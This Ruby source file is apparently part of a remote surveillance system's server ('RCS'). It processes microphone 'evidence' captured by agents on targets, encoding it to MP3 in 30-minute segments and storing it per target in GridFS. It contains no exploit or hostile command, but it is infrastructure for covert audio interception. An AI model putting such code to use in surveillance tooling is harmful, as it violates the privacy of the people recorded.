require 'ffi'
require 'mongoid'
require 'stringio'

require 'rcs-common/trace'

require_relative 'libs/wave'
require_relative 'libs/SRC/src'
require_relative 'libs/lame/lame'
require_relative 'libs/speex/speex'

module RCS
module Worker

  class MicRecording
    include Tracer

    attr_accessor :timecode, :duration, :sample_rate, :bid, :raw_counter

    def initialize(evidence, agent, target)
      @bid = Moped::BSON::ObjectId.new
      @target = target
      @mic_id = evidence[:data][:mic_id]
      @sample_rate = evidence[:data][:sample_rate]
      @start_time = evidence[:da]
      @duration = 0
      @raw_counter = 0
      @evidence = store evidence[:da], agent, @target
    end

    def accept?(evidence)
      @mic_id == evidence[:data][:mic_id] and @duration < 1800 # split every 30 minutes
    end

    def file_name
      "#{@mic_id.to_i.to_s}:#{@start_time}"
    end

    def close!
      yield @evidence
    end

    def feed(evidence)
      @raw_counter += 1
      @duration += (1.0 * evidence[:wav].size) / @sample_rate

      left_pcm = Array.new evidence[:wav]
      right_pcm = Array.new evidence[:wav]

      yield @sample_rate, left_pcm, right_pcm
    end

    def update_attributes(hash)
      @evidence.update_attributes(hash) unless @evidence.nil?
    end

    def update_data(hash)
      @evidence.update_attributes(data: @evidence.data.merge!(hash)) unless @evidence.nil?
    end

    def store(acquired, agent, target)
      coll = ::Evidence.target(target[:_id].to_s)
      coll.create do |ev|
        ev._id = @bid
        ev.aid = agent[:_id].to_s
        ev.type = :mic

        ev.da = acquired.to_i
        ev.dr = Time.now.to_i
        ev.rel = 0
        ev.blo = false
        ev.note = ""

        ev.data ||= Hash.new
        ev.data[:duration] = 0

        ev.with(safe: true).save!
        ev
      end
    end
  end

  class MicProcessor
    include Tracer

    def tc(evidence)
      evidence[:da] - (evidence[:wav].size / evidence[:data][:sample_rate])
    end

    def feed(evidence, agent, target)
      @mic ||= MicRecording.new(evidence, agent, target)
      unless @mic.accept? evidence
        @mic.close! {|evidence| yield evidence}
        @mic = MicRecording.new(evidence, agent, target)
        trace :debug, "created new MIC processor #{@mic.bid}"
      end

      @mic.feed(evidence) do |sample_rate, left_pcm, right_pcm|
        #trace :debug, "Sample of mp3: #{sample_rate}"
        encode_mp3(sample_rate, left_pcm, right_pcm) do |mp3_bytes|
          #File.open("#{@mic.file_name.to_i}.mp3", 'ab') {|f| f.write(mp3_bytes) }
          write_to_grid(@mic, mp3_bytes, target, agent)
        end
      end

      # explicitly invoke the Garbage Collector to free some RAM
      # the wav allocated in memory could consume many resources
      GC.start

      return @mic.bid, @mic.raw_counter
    end

    def encode_mp3(sample_rate, left_pcm, right_pcm)
      # MP3Encoder will take care of resampling if necessary
      @encoder ||= ::MP3Encoder.new(2, sample_rate)
      unless @encoder.nil?
        @encoder.feed(left_pcm, right_pcm) do |mp3_bytes|
          yield mp3_bytes
        end
      end
    end

    def write_to_grid(mic, mp3_bytes, target, agent)
      collection = "grid.#{target[:_id]}"
      file_id, file_length = *RCS::DB::GridFS.append(mic.file_name, mp3_bytes, collection)
      mic.update_data(_grid: Moped::BSON::ObjectId.from_string(file_id.to_s), _grid_size: file_length, duration: mic.duration)
      agent.stat.size += mp3_bytes.bytesize
      agent.save
    end
  end

end # Worker
end # RCS